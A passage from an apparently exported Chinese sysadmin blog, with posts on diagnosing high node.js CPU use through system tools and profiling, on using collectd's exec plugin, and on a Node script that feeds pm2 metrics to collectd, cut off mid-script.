| 25482 | 44 |  5 | 51 |  0 |  0 |\n|  9 | 0 |    0 | 39734116 | 595424 | 7559024 |  0 |  0 |  0 |  5156 |  98440 | 25393 | 42 |  5 | 53 |  0 |  0 |\n| 16 | 0 |    0 | 39729280 | 595424 | 7564076 |  0 |  0 |  0 |  5204 | 108933 | 23535 | 49 |  5 | 45 |  0 |  0 |\n| 18 | 0 |    0 | 39722832 | 595424 | 7568280 |  0 |  0 |  0 |  5276 | 111563 | 23965 | 51 |  5 | 44 |  0 |  0 |\n|----+---+------+----------+--------+---------+----+----+----+-------+--------+-------+----+----+----+----+----|\n</pre>\n\n<p>\n<code>sar</code>\n</p>\n<pre class=\"example\">\n# sar -n TCP 1\n01:58:46 PM  active/s passive/s    iseg/s    oseg/s\n01:58:47 PM      3.09    875.26  32375.26  33619.59\n01:58:48 PM      0.00    575.25  27972.28  28961.39\n01:58:49 PM      0.00    879.59  31104.08  31933.67\n01:58:50 PM      1.02    743.88  30183.67  31516.33\n01:58:51 PM      0.00    793.94  31734.34  32761.62\n01:58:52 PM      0.00    571.88  28690.62  29415.62\n01:58:53 PM      1.02   1004.08  33157.14  33673.47\n01:58:54 PM      0.99    954.46  33315.84  34532.67\n01:58:55 PM      1.00    910.00  33562.00  34338.00\n01:58:56 PM      1.02    783.67  31754.08  32412.24\n</pre>\n</div>\n</div>\n\n<div id=\"outline-container-sec-3\" class=\"outline-2\">\n<h2 id=\"sec-3\">应用状态</h2>\n<div class=\"outline-text-2\" id=\"text-3\">\n<p>\n<code>ps</code>\n</p>\n<pre class=\"example\">\n# ps waux | grep node\nnobody   190790 61.0  1.4 1902228 974408 ?      Rl   Apr20 12154:57 node /usr/local/xxx.xxxxxxxx.com/src/index.js\nnobody   190881 61.4  1.4 1907188 980800 ?      Rl   Apr20 12237:31 node /usr/local/xxx.xxxxxxxx.com/src/index.js\nnobody   191463 61.8  1.5 1929392 1005164 ?     Sl   Apr20 12317:05 node /usr/local/xxx.xxxxxxxx.com/src/index.js\nnobody   191515 61.7  1.5 1957252 1030472 ?     Rl   Apr20 12287:48 node /usr/local/xxx.xxxxxxxx.com/src/index.js\nnobody   191609 61.1  1.4 1891508 967896 ?      Rl   Apr20 12183:27 node /usr/local/xxx.xxxxxxxx.com/src/index.js\nnobody   192063 61.7  1.5 1951056 1025216 ?     Rl   Apr20 12300:27 node /usr/local/xxx.xxxxxxxx.com/src/index.js\nnobody   192946 61.3  1.5 1943880 1017796 ?     Rl   Apr20 12204:24 node /usr/local/xxx.xxxxxxxx.com/src/index.js\nnobody   193029 61.6  1.4 1871180 946732 ?      Rl   Apr20 12271:35 node /usr/local/xxx.xxxxxxxx.com/src/index.js\nnobody   193068 60.9  1.5 1918404 993536 ?      Rl   Apr20 12124:33 node /usr/local/xxx.xxxxxxxx.com/src/index.js\nnobody   193725 61.8  1.5 1929488 1001552 ?     Rl   Apr20 12316:31 node /usr/local/xxx.xxxxxxxx.com/src/index.js\nnobody   194450 60.5  1.4 1887224 960012 ?      Sl   Apr20 12040:16 node /usr/local/xxx.xxxxxxxx.com/src/index.js\nnobody   194523 59.9  1.4 1848960 924596 ?      Rl   Apr20 11928:46 node /usr/local/xxx.xxxxxxxx.com/src/index.js\nnobody   195178 58.4  1.3 1838980 913052 ?      Rl   Apr20 11627:32 node /usr/local/xxx.xxxxxxxx.com/src/index.js\nnobody   195276 58.5  1.3 1829848 905212 ?      Rl   Apr20 11639:08 node /usr/local/xxx.xxxxxxxx.com/src/index.js\nnobody   195944 56.9  1.4 1859316 933892 ?      Rl   Apr20 11333:25 node /usr/local/xxx.xxxxxxxx.com/src/index.js\nnobody   196001 57.3  1.5 1930348 1004912 ?     Rl   Apr20 11408:17 node /usr/local/xxx.xxxxxxxx.com/src/index.js\n</pre>\n\n<p>\n<code>pm2</code>\n</p>\n<pre class=\"example\">\n# pm2 desc xxx.xxxxxxxx.com | grep 'Loop delay'\n│ Loop delay │ 1.96ms │\n│ Loop delay │ 2.01ms │\n│ Loop delay │ 2.04ms │\n│ Loop delay │ 2.3ms  │\n│ Loop delay │ 1.76ms │\n│ Loop delay │ 1.97ms │\n│ Loop delay │ 2.12ms │\n│ Loop delay │ 1.98ms │\n│ Loop delay │ 2.16ms │\n│ Loop delay │ 1.98ms │\n│ Loop delay │ 2.07ms │\n│ Loop delay │ 1.88ms │\n│ Loop delay │ 2.61ms │\n│ Loop delay │ 1.84ms │\n│ Loop delay │ 1.84ms │\n│ Loop delay │ 1.88ms │\n</pre>\n</div>\n</div>\n\n<div id=\"outline-container-sec-4\" class=\"outline-2\">\n<h2 id=\"sec-4\">分析</h2>\n<div class=\"outline-text-2\" id=\"text-4\">\n</div><div id=\"outline-container-sec-4-1\" class=\"outline-3\">\n<h3 id=\"sec-4-1\">系统负荷正常</h3>\n<div class=\"outline-text-3\" id=\"text-4-1\">\n<p>\n<code>top</code> 的 <code>load average</code> 值远小于 CPU 核数，系统的 CPU 使用率为 25%，还有足够的空闲 CPU 资源。\n</p>\n</div>\n</div>\n\n<div id=\"outline-container-sec-4-2\" class=\"outline-3\">\n<h3 id=\"sec-4-2\">node.js 的 CPU 占用过高</h3>\n<div class=\"outline-text-3\" id=\"text-4-2\">\n<ul class=\"org-ul\">\n<li>运行和等待 CPU 时间片的进程数偏高\n\n<p>\n参见 <code>vmstat</code> 的 <code>r</code> 列\n</p>\n</li>\n</ul>\n\n\n<ul class=\"org-ul\">\n<li>中断数偏多\n\n<p>\n参见 <code>vmstat</code> 的 <code>in</code> 列\n</p>\n\n<p>\n有可能是网络 I/O 数过多引起，参见 <code>sar</code> 的 <code>iseg/s</code> <code>oseg/s</code> 列。\n</p>\n\n<p>\n中断数虽多，但并非瓶颈，参见 <code>top</code> 的 <code>%hi</code> 和 <code>%si</code> 值。\n</p>\n</li>\n</ul>\n\n\n<ul class=\"org-ul\">\n<li>上下文切换较多\n\n<p>\n参见 <code>vmstat</code> 的 <code>cs</code> 列\n</p>\n\n<p>\n上下文切换数远小于中断数，正常。\n</p>\n</li>\n</ul>\n\n\n<ul class=\"org-ul\">\n<li>用户模式下 CPU 占用过高\n\n<p>\n超过 50%\n</p>\n\n<p>\n参见 <code>vmstat</code> 的 <code>us</code> 列\n</p>\n</li>\n\n<li>node.js 进程事件循环迟延小于 3ms\n\n<p>\n正常。应用目前还能够提供快速响应。\n</p>\n</li>\n\n<li>node.js 进程 CPU 占用过高\n\n<p>\n统计了一天平均占用 65%，高峰占用 85% 以上。\n</p>\n\n<p>\n参见 <code>ps</code> 输出\n</p>\n\n<p>\n应用本身是网络密集型，每 node.js 进程每秒钟处理 250 个请求，不存在 CPU 密集操作，这样高的 CPU 占用是不可接受的。\n</p>\n</li>\n</ul>\n</div>\n</div>\n\n<div id=\"outline-container-sec-4-3\" class=\"outline-3\">\n<h3 id=\"sec-4-3\">网络带宽占用正常</h3>\n<div class=\"outline-text-3\" id=\"text-4-3\">\n<ul class=\"org-ul\">\n<li>对外的网卡\n\n<p>\n上行 27Mbps，下行 66Mbps\n</p>\n\n<p>\n主要是来自设备和客户端的流量。\n</p>\n</li>\n\n<li>对内的网卡\n\n<p>\n上行 18.7Mbps，下行 21.7Mbps\n</p>\n\n<p>\n主要是内部通信流量（redis）。\n</p>\n</li>\n</ul>\n</div>\n</div>\n\n<div id=\"outline-container-sec-4-4\" class=\"outline-3\">\n<h3 id=\"sec-4-4\">磁盘访问较少</h3>\n<div class=\"outline-text-3\" id=\"text-4-4\">\n<p>\n应用除了写少量日志外不访问磁盘。\n</p>\n</div>\n</div>\n\n<div id=\"outline-container-sec-4-5\" class=\"outline-3\">\n<h3 id=\"sec-4-5\">结论</h3>\n<div class=\"outline-text-3\" id=\"text-4-5\">\n<ul class=\"org-ul\">\n<li>系统资源不存在瓶颈\n</li>\n\n<li>系统当前的运行状况良好\n</li>\n\n<li>node.js 应用的 CPU 占用偏高\n\n<p>\n需要对 node.js 应用进行性能分析及优化\n</p>\n</li>\n</ul>\n</div>\n</div>\n</div>\n\n<div id=\"outline-container-sec-5\" class=\"outline-2\">\n<h2 id=\"sec-5\">node.js 应用性能分析</h2>\n<div class=\"outline-text-2\" id=\"text-5\">\n<p>\nnode.js 从 4.4.0 版本开始内置了 profiler， <code>--prof</code> 命令选项运行应用会在当前目录生成性能日志文件。\n</p>\n\n<p>\n解读性能日志文件\n</p>\n<pre class=\"example\">\n# node --prof-process isolate-0x1d1e1b0-v8-10041.log\n...\n[Summary]:\n   ticks  total  nonlib   name\n    348    7.3%    7.6%  JavaScript\n   4243   88.8%   92.4%  C++\n     63    1.3%    1.4%  GC\n    184    3.9%          Shared libraries\n      2    0.0%          Unaccounted\n...\n [C++ entry points]:\n   ticks    cpp   total   name\n    494   19.4%   10.3%  v8::internal::Runtime_DateCurrentTime(int, v8::internal::Object**, v8::internal::Isolate*)\n...\n   ticks parent  name\n   1739   36.4%  syscall\n\n    586   12.3%  __lll_lock_wait\n    413   70.5%    v8::internal::Runtime_DateCurrentTime(int, v8::internal::Object**, v8::internal::Isolate*)\n    398   96.4%      LazyCompile: *now native date.js:197:17\n    305   76.6%        LazyCompile: *&lt;anonymous&gt; /usr/local/xxxxx.xxxxxxxx.com/src/models.js:43:30\n...\n</pre>\n\n<p>\n最大头的时间花在系统调用上，通过 strace 工具统计 node.js 进程 10 秒钟的系统调用计数\n</p>\n<pre class=\"example\">\n12259 write\n10501 read\n 9261 epoll_ctl\n 1564 epoll_wait\n  503 close\n  502 recvmsg\n  502 getsockopt\n  502 getsockname\n  103 futex\n   23 stat\n    6 writev\n    1 getpeername\n</pre>\n\n<p>\n系统调用主要进行网络 I/O ，如：与设备通信（TLS 长连接）、与客户端通信（HTTP 短连接）、与Redis通信（TCP 长连接）。\n</p>\n\n<p>\n其它调用出现次数最多的是获取当前时间戳的函数 models.js:43：\n</p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-js\"><span style=\"color: #99cc99;\">function</span> <span style=\"color: #f99157;\">getTimestamp</span> () {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">return</span> Math.floor(Date.now() / 1000);\n}\n</pre>\n</div>\n\n<p>\n它会在很多地方被用到，如：当从 redis 收到一条订阅的消息时，会在消息中添加当前时间戳，方便后面处理。\n</p>\n\n<p>\n可以通过缓存减少这部分开销：\n</p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-js\"><span style=\"color: #99cc99;\">function</span> <span style=\"color: #f99157;\">getTimestamp</span> () {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">if</span> (! getTimestamp._timestamp) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   getTimestamp._timestamp = Math.floor(Date.now() / 1000);\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   setInterval(<span style=\"color: #99cc99;\">function</span> () {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   getTimestamp._timestamp = Math.floor(Date.now() / 1000);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }, 1000).unref();\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">return</span> getTimestamp._timestamp;\n}\ngetTimestamp._timestamp = 0;\n</pre>\n</div>\n\n<p>\n上面的代码，虽然调用次数相对较多，但并不耗 CPU，经过上面的优化后，总系统 CPU 占用只是略有减少。\n</p>\n\n<p>\n关键的系统调用消耗难以再优化，在我们的应用中，node.js 单实例处理能力的上限：4K TLS 长连接（平均 CPU 占用 85%）。\n</p>\n\n<p>\n最终决定，增加服务器上 node.js 进程的数量，node.js 最大连接数限制（ <a href=\"https://nodejs.org/api/net.html#net_server_maxconnections\">net.maxConnections</a> ）进一步减少。\n</p>\n</div>\n</div>\n\n<div id=\"outline-container-sec-6\" class=\"outline-2\">\n<h2 id=\"sec-6\">参考</h2>\n<div class=\"outline-text-2\" id=\"text-6\">\n<p>\n<a href=\"http://www.ruanyifeng.com/blog/2011/07/linux_load_average_explained.html\">理解Linux系统负荷 - 阮一峰的网络日志</a>\n</p>\n\n<p>\n<a href=\"http://www.blogjava.net/sliverfancy/archive/2013/04/17/397947.html\">Linux-Load Average解析(转) - java技术研究 - BlogJava</a>   \n</p>\n\n<p>\n<a href=\"http://www.trueeyu.com/?p=1749\">linux系统性能监控与优化（2）–cpu | 小鳄的笔记本</a>\n</p>\n\n<p>\n<a href=\"https://nodejs.org/en/docs/guides/simple-profiling/\">Easy profiling for Node.js Applications | Node.js</a></p>\n</div>\n</div>\n"
},
{
  "title": "collectd exec 插件使用进阶",
  "timestamp": "2016-05-05 12:44:00",
  "tags": [
    "linux",
    "collectd"
  ],
  "body": "<p>\n前面一篇文章《<a href=\"http://blog.kankanan.com/article/4f7f7528-collectd-8fdb884c670d52a176d163a7.html\">使用 collectd 进行服务监控 | 看看俺 – KanKanAn.com</a>》展示了如何使用 collectd 的 exec 插件。\n</p>\n\n<p>\n要使收集的统计信息显示正常、易于使用，则需要对上报的数据有充分的理解。\n</p>\n\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">数据的标识</h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<p>\n引用自 <a href=\"https://collectd.org/documentation/manpages/collectd-exec.5.shtml\">man 5 collectd-exec</a>\n</p>\n<blockquote>\n<p>\nPUTVAL Identifier [OptionList] Valuelist\n  Submits one or more values (identified by Identifier, see below) to the daemon which will dispatch it to all it's write-plugins.\n</p>\n\n<p>\nAn Identifier is of the form \"host/plugin-instance/type-instance\" with both instance-parts being optional. If they're omitted the hyphen must be omitted, too. plugin and each instance-part may be chosen freely as long as\nthe tuple (plugin, plugin instance, type instance) uniquely identifies the plugin within collectd. type identifies the type and number of values (i. e. data-set) passed to collectd. A large list of predefined data-sets is\navailable in the types.db file. See types.db(5) for a description of the format of this file.\n</p>\n\n<p>\nThe OptionList is an optional list of Options, where each option is a key-value-pair. A list of currently understood options can be found below, all other options will be ignored. Values that contain spaces must be quoted\nwith double quotes.\n</p>\n\n<p>\nValuelist is a colon-separated list of the time and the values, each either an integer if the data-source is a counter, or a double if the data-source is of type \"gauge\". You can submit an undefined gauge-value by using\nU. When submitting U to a counter the behavior is undefined. The time is given as epoch (i. e. standard UNIX time).\n</p>\n\n<p>\nYou can mix options and values, but the order is important: Options only effect following values, so specifying an option as last field is allowed, but useless. Also, an option applies to all following values, so you\ndon't need to re-set an option over and over again.\n</p>\n\n<p>\nThe currently defined Options are:\n</p>\n\n<p>\ninterval=seconds\n    Gives the interval in which the data identified by Identifier is being collected.\n</p>\n\n<p>\nPlease note that this is the same format as used in the unixsock plugin, see collectd-unixsock(5). There's also a bit more information on identifiers in case you're confused.\n</p>\n\n<p>\nSince examples usually let one understand a lot better, here are some:\n</p>\n\n<p>\nPUTVAL leeloo/cpu-0/cpu-idle N:2299366\nPUTVAL alice/interface/if_octets-eth0 interval=10 1180647081:421465:479194\n</p>\n</blockquote>\n\n<ul class=\"org-ul\">\n<li><code>Identifier</code> \n\n<p>\n格式为 <code>host/plugin-instance/type-instance</code> \n</p>\n\n<p>\n其中的 <code>-</code> 为分隔符， <code>instance</code> 部分是可省略（此时 <code>-</code> 也要省略）。\n</p>\n</li>\n\n<li><code>host</code>\n\n<p>\n主机名称，通常取自 <code>HOSTNAME</code> 环境变量。\n</p>\n</li>\n\n<li><code>plugin</code> \n\n<p>\n插件名称。\n</p>\n</li>\n\n<li><code>type</code>\n\n<p>\n预定义的值类型名称，定义值的类型及数量，以及 collectd 服务会对值做何处理（如：按时间间隔平均化）。\n</p>\n\n<p>\n参考 <a href=\"https://collectd.org/documentation/manpages/types.db.5.shtml\">man 5 types.db</a> <a href=\"https://collectd.org/wiki/index.php/Data_source\">Data source - collectd Wiki</a>\n</p>\n\n<p>\n如某个上报的统计指标在网页上没有对应的图表产生，请检查 collectd 服务器与客户机上 types.db，数据集必须定义且一致，上报的值必须符合数据集定义。\n服务器或客户端安装的 collectd 可能版本较低，附带的 types.db 中缺少第三方插件要求的数据集定义，运营人员改动 types.db 中 memory 类型也会导致上报失败：\n</p>\n<pre class=\"example\">\n# memory         value:GAUGE:0:281474976710656\nmemory          free:GAUGE:0:281474976710656, buffered:GAUGE:0:281474976710656, used:GAUGE:0:281474976710656, cached:GAUGE:0:281474976710656\n</pre>\n</li>\n</ul>\n</div>\n</div>\n\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\">数据的展示</h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n<p>\n数据由上到下分级展示。\n</p>\n\n<ul class=\"org-ul\">\n<li>主机列表\n\n<p>\n选择要查看的主机，对应上面的 <code>host</code>\n</p>\n</li>\n</ul>\n\n\n<ul class=\"org-ul\">\n<li>插件列表\n\n<p>\n选择要查看的插件，对应上面的 <code>plugin</code>\n</p>\n</li>\n</ul>\n\n\n<ul class=\"org-ul\">\n<li>统计图表列表页\n\n<p>\n插件实例（ <code>plugin instance</code> ）+类型（ <code>type</code> ）产生一张图表，类型实例（ <code>type instance</code> ）对应图标上的一条曲线。\n</p>\n</li>\n</ul>\n\n\n<ul class=\"org-ul\">\n<li>统计图表详情页\n\n<p>\n点击统计图表列表页上的图表进入统计图表详情页，此时可以选择统计的时间范围（如：按小时、天、周、月、年）。\n</p>\n\n<p>\n另外可以聚合显示所有主机上的相同统计图表，以便进行交叉对比。\n</p>\n</li>\n</ul>\n</div>\n</div>\n\n<div id=\"outline-container-sec-3\" class=\"outline-2\">\n<h2 id=\"sec-3\">标识的使用</h2>\n<div class=\"outline-text-2\" id=\"text-3\">\n<p>\n上报数据时，我们拥有极大的自由性，而 collectd 会宽容地接受并展示结果，但是为了让最终的结果有用、易用，我们需要正确地指定上报的信息项。\n</p>\n\n<ul class=\"org-ul\">\n<li><code>host</code>\n\n<p>\n应该填写主机名称，当我们需要整个服务（包括多台主机）的统计时，可以借助 collectd 界面提供的聚合功能实现。\n</p>\n</li>\n</ul>\n\n\n<ul class=\"org-ul\">\n<li><code>plugin</code>\n\n<p>\n插件名称\n</p>\n</li>\n\n<li><code>plugin instance</code>\n\n<p>\n插件实例，对应插件收集一个统计指标名称，如：memory。\n</p>\n\n<p>\n对于简单的插件（只收集一个统计指标），则可以直接省略插件实例（plugin instance）部分，插件名称命名使用统计指标名称。\n</p>\n</li>\n\n<li><code>type</code>\n\n<p>\n请在 types.db 中预定义的类型中选择。\n</p>\n</li>\n\n<li><code>type instance</code>\n\n<p>\n对于主机上的唯一统计指标（如：load），就不需要使用 <code>type instance</code> 了，如果是主机上的非唯一统计指标（如：各分区使用率、进程 cpu 占用率等），则可以使用 <code>type instance</code> 来区分（如：填写为分区路径、进程名称等）。\n</p>\n\n<p>\n多个 <code>type instance</code> 会在同一张图表中各使用一条曲线展示，如果放在一起展示没有意义，则可能更适合使用 <code>plugin instance</code> 进行标识。\n</p>\n</li>\n</ul>\n</div>\n</div>\n\n<div id=\"outline-container-sec-4\" class=\"outline-2\">\n<h2 id=\"sec-4\">突破 root 帐号限制</h2>\n<div class=\"outline-text-2\" id=\"text-4\">\n<p>\n引用自 <a href=\"https://collectd.org/documentation/manpages/collectd-exec.5.shtml\">man 5 collectd-exec</a>\n</p>\n<blockquote>\n<p>\nCAVEATS\n    ·   The user, the binary is executed as, may not have root privileges, i. e.  must have an UID that is non-zero. This is for your own good.\n</p>\n</blockquote>\n\n<p>\nExec 插件不允许以 root 权限执行。\n</p>\n\n<ul class=\"org-ul\">\n<li>温和的解决办法\n\n<p>\n引用自 <a href=\"https://collectd.org/wiki/index.php/Plugin:Exec\">Plugin:Exec - collectd Wiki</a>\n</p>\n<blockquote>\n<p>\nThe security concerns are addressed by forcing the plugin to check that custom programs are never executed with superuser privileges. If the daemon runs as root, you have to configure another user ID with which the new process is created. To circumvent missing access privileges to files, you need to lean on the unix group concept. I.e. your script requires access to /var/log/messages, which is owned by root, its common practice to have this file being group readable by the admin-group. Given the used ID corrosponds to MyWatcherUser, you need to add that user to the admin group via /etc/group (or what else manages users / groups on your system). \n</p>\n</blockquote>\n\n<p>\n将原本需要 <code>root</code> 才能访问的文件，改变属组（ <code>group</code> ）为 <code>admin</code> ，权限为 <code>group</code> 可读，然后将插件账号的 <code>group</code> 也改为 <code>admin</code> 。\n</p>\n</li>\n\n<li>暴力的解决方法\n\n<p>\n利用 <code>setuid</code> ，允许可执行程序以 <code>root</code> 身份运行。\n</p>\n\n<p>\n参考\n<a href=\"http://blog.kankanan.com/article/linux-4e0b51418bb8666e901a752862376267884c97008981-root-674396507684547d4ee4.html\">linux下允许普通用户执行需要root权限的命令 | 看看俺 – KanKanAn.com</a></p>\n</li>\n</ul>\n</div>\n</div>\n"
},
{
  "title": "使用 collectd 监控 pm2 应用性能",
  "timestamp": "2016-05-05 16:45:00",
  "tags": [
    "collectd",
    "node",
    "pm2"
  ],
  "body": "<p>\n<a href=\"https://github.com/Unitech/pm2\">pm2</a> 是 node.js 应用的产品级进程管理器。\n</p>\n\n<blockquote>\n<p>\nPM2 is a production process manager for Node.js applications with a built-in load balancer. It allows you to keep applications alive forever, to reload them without downtime and to facilitate common system admin tasks.\n</p>\n</blockquote>\n\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">关键性能指标</h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<p>\n通过 <a href=\"https://github.com/Unitech/pm2\">pm2</a> 可以获取到 node.js 应用的几个关键性能指标：\n</p>\n\n<ul class=\"org-ul\">\n<li>Memory used\n\n<p>\nnode.js 应用的内存占用。\n</p>\n\n<p>\nnode.js（v8） 通过垃圾收集（GC）技术进行自动内存管理，这里测量到的内存占用还包含一部分未回收的垃圾。\n</p>\n</li>\n\n<li>CPU used\n\n<p>\nnode.js 应用的 CPU 占用。\n</p>\n\n<p>\nnode.js 是单线程模型，虽然所有 I/O 操作是异步的，但是代码指令执行是同步的，过多的请求处理或消耗 CPU 的操作会导致应用响应速度变慢，可能无法提供正常的服务。\n</p>\n</li>\n\n<li>Loop delay\n\n<p>\nnode.js 应用事件循环的延迟。\n</p>\n\n<p>\npm2 测量 node.js 应用 Loop delay 的逻辑如下：\n</p>\n\n<blockquote>\n<p>\n记下开始时间（ process.hrtime ）\n</p>\n\n<p>\n设置 1 秒钟的定时器（setInterval）\n</p>\n\n<p>\n定时器触发时获取结束时间（ process.hrtime ）\n</p>\n\n<p>\n结束时间与开始时间的时间差减去 1 秒钟就是 Loop delay\n</p>\n</blockquote>\n<p>\n具体实现请查阅 pm2 源代码：node_modules/pm2/node_modules/pmx/lib/probes/pacemaker.js\n</p>\n</li>\n</ul>\n\n\n<p>\n一般来说 <code>Loop delay</code> 与 <code>CPU used</code> 指标是正相关的，但是如果 node.js 应用不小心调用了一些同步 I/O 操作或 I/O 出现瓶颈，则会出现 <code>CPU used</code> 低但是 <code>Loop delay</code> 高的情况。\n</p>\n\n<ul class=\"org-ul\">\n<li>restart_time 及 unstable_restarts\n\n<p>\nnode.js（javascript）是一门动态语言，很少运行到的代码分支里一个错误的变量引用就可能导致整个应用异常退出，pm2 会在 node.js 应用退出时自动重新拉起应用，\n但这可能会掩盖潜藏的问题（BUG），监控 node.js 应用的重启次数可以及时发现这种问题（BUG）。\n</p>\n</li>\n</ul>\n\n<p>\n上线新代码后，通过观测这几个关键性能指标，以及与历史记录进行对比，可以用来评估新代码的运行效率与质量。\n</p>\n</div>\n</div>\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\">收集性能指标</h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n<p>\n通过 pm2 收集 node.js 应用性能指标的脚本 <code>/usr/local/bin/collectd-pm2.js</code>\n</p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-js\"><span style=\"color: #99cc99;\">var</span> <span style=\"color: #ffcc66;\">os</span> = require(<span style=\"color: #66cccc;\">'os'</span>);\n<span style=\"color: #99cc99;\">var</span> <span style=\"color: #ffcc66;\">exec</span> = require(<span style=\"color: #66cccc;\">'child_process'</span>).exec;\n\n\n<span style=\"color: #99cc99;\">var</span> <span style=\"color: #ffcc66;\">hostname</span> = process.env.COLLECTD_HOSTNAME || os.hostname();\n<span style=\"color: #99cc99;\">var</span> <span style=\"color: #ffcc66;\">interval</span> = parseInt(process.env.COLLECTD_INTERVAL, 10) || 1;\n\n<span style=\"color: #99cc99;\">function</span> <span style=\"color: #f99157;\">collect</span> () {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   exec(<span style=\"color: #66cccc;\">'pm2 jlist'</span>, <span style=\"color: #99cc99;\">function</span> (<span style=\"color: #ffcc66;\">error</span>, <span style=\"color: #ffcc66;\">stdout</span>, <span style=\"color: #ffcc66;\">stderr</span>) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">if</span> (error) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   process.stderr.write(error.toString());\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   process.exit(1);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">if</span> (stderr) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   process.stderr.write(stderr.toString() + <span style=\"color: #66cccc;\">\"\\n\"</span>);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">var</span> <span style=\"color: #ffcc66;\">timestamp</span> = Math.floor(Date.now() / 1000);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">var</span> <span style=\"color: #ffcc66;\">list</span> = JSON.parse(stdout);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   list.forEach(<span style=\"color: #99cc99;\">function</span> (<span style=\"color: #ffcc66;\">item</span>) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">var</span> <span style=\"color: #ffcc66;\">name</span> = <span style=\"color: #66cccc;\">''</span>;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">for</span>(<span style=\"color: #99cc99;\">var</span> <span style=\"color: #ffcc66;\">i</span> = 0, <span style=\"color: #ffcc66;\">n</span> = item.name.length; i &lt; n; ++i) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   name += item.name[i].match(<span style=\"color: #66cccc;\">/^[0-9a-zA-Z]+$/</span>) ? item.name[i] : <span style=\"color: #66cccc;\">'_</span><span style=\"color: #66cccc; text-decoration: underline;\">'</span><span style=\"text-decoration: underline;\">;</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   process.stdout.write(<span style=\"color: #66cccc;\">\"PUTVAL \\\"\"</span> + hostname + <span style=\"color: #66cccc;\">\"/\"</span> + name + <span style=\"color: #66cccc;\">\"-loop_de</span><span style=\"color: #66cccc; text-decoration: underline;\">lay\"</span><span style=\"text-decoration: underline;\"> + </span><span style=\"color: #66cccc; text-decoration: underline;\">\"/delay-\"</span><span style=\"text-decoration: underline;\"> + item.pm_id + </span><span style=\"color: #66cccc; text-decoration: underline;\">\"\\\" interval=\"</span><span style=\"text-decoration: underline;\"> + interval + </span><span style=\"color: #66cccc; text-decoration: underline;\">\" \"</span><span style=\"text-decoration: underline;\"> + timestamp + </span><span style=\"color: #66cccc; text-decoration: underline;\">\":\"</span><span style=\"text-decoration: underline;\"> + item.pm2_env.axm_monitor[</span><span style=\"color: #66cccc; text-decoration: underline;\">\"Loop delay\"</span><span style=\"text-decoration: underline;\">].value.replace(</span><span style=\"color: #66cccc; text-decoration: underline;\">'ms'</span><span 